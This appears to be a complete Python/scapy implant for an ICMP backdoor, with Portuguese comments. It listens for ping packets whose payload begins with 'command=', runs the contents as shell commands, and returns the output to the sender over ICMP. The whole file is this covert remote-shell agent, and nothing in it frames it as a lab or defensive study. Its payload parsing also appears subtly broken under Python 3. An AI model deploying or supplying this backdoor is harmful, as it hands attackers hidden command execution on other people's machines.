from scapy.all import *

my_ips = []

for interface_name in get_if_list():
  my_ips.append(get_if_addr(interface_name))

print('My Ips:')
print(my_ips)

def handle_icmp(pkt):
    if 'ICMP' in pkt and 'Raw' in pkt:
        payload = str(pkt["Raw"].load) # Carregadar o comando do payload do icmp
        if payload.startswith('command=') and pkt['ICMP'].type == 8: # Echo request
          cmd = payload.replace('command=', '')
          results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
          command_result = 'command_result=' + str((results.stdout.read() + results.stderr.read()).decode('utf-8'))
          src = pkt['IP'].src
          print(src)
          print(command_result)
          sr1(IP(dst=src)/ICMP()/command_result) # Retornar o resultado do comando para o Main

sniff(filter="icmp", prn=handle_icmp)